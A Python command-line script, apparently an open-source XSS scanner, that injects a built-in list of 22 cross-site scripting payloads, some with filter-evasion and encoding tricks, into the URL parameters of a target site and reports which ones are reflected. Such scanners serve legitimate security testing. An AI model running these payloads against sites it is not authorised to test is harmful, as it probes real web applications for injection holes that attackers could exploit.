#!/usr/bin/env python

import requests
import os
from bs4 import BeautifulSoup
import argparse
from termcolor import colored

os.system("clear")
os.system("figlet DegreatArizona XSS")
print()
print(colored("Author   : DegreatArizona", 'green'))
print(colored("Website  : https://degreatarizona.com", 'blue'))
print(colored("Github   : https://github.com/DegreatArizona", 'blue'))
print(colored("YouTube  : https://www.youtube.com/@DegreatArizona", 'blue'))
print(colored("LinkedIn : https://www.linkedin.com/in/degreatarizona", 'blue'))
print(colored("Twitter  : https://twitter.com/degreatarizona", 'blue'))
print(colored("This tool is written for educational purposes only :)", 'yellow'))
print(colored("Degreatarizona is not responsible for misusing it.", 'yellow'))
print()

# Common XSS payloads
default_payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe srcdoc='<script>alert(\"XSS\")</script>'></iframe>",
    "<a href='data:text/html,<script>alert(\"XSS\")</script>'>Click me</a>",
    "<svg/onload=alert('XSS')></svg>",
    "<svg><script>alert('XSS')</script></svg>",
    "'>'><script>alert('XSS')</script>",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "<body onresize=alert('XSS')></body>",
    "<object data='javascript:alert(\"XSS\")'></object>",
    "<style>body{background:url(\"javascript:alert('XSS')\")}</style>",
    "<div><div><input value='``'><svg/onload=alert(1)></div></div>",
    "+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-",
    "${alert('XSS')}",
    "<script>%61%6c%65%72%74('XSS')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>\x00",
    "'><script>alert('XSS')</script>",
    "<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(1)</script>"
]

def load_payloads_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(colored(f"Error reading payload file: {e}", 'red'))
        return []

def scan_xss(url, params, payloads, cookies=None):
    for param in params:
        for payload in payloads:
            # Create a copy of the parameters and inject the payload
            test_params = params.copy()
            test_params[param] = payload
            try:
                response = requests.get(url, params=test_params, cookies=cookies)
                print(colored(f"Testing {param} with payload: {payload}", 'green'))
                print(colored(f"URL: {response.url}", 'green'))

                if payload in response.text:
                    print(colored(f"[!] Potential XSS vulnerability found with payload: {payload}", 'red'))
                    print(colored(f"Parameter: {param}", 'red'))
                    print(colored(f"URL: {response.url}", 'red'))
                    print(colored("="*50, 'red'))
                else:
                    print(colored(f"[+] No XSS vulnerability found with payload: {payload} on parameter: {param}", 'green'))
                    print(colored("="*50, 'green'))
            except requests.RequestException as e:
                print(colored(f"Error during request: {e}", 'yellow'))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple XSS Scanner")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("params", nargs="+", help="Parameters to test (e.g., 'param1 param2')")
    parser.add_argument("--cookies", help="Cookies to include in the request (key=value;key2=value2)")
    parser.add_argument("--payload-file", help="File containing XSS payloads (xss-payload-list.txt)")

    args = parser.parse_args()

    target_url = args.url
    parameters = {param: "" for param in args.params}

    cookies = None
    if args.cookies:
        cookies = dict(item.split("=") for item in args.cookies.split(";"))

    payloads = default_payloads
    if args.payload_file:
        payloads = load_payloads_from_file(args.payload_file)

    # Perform the scan
    scan_xss(target_url, parameters, payloads, cookies)
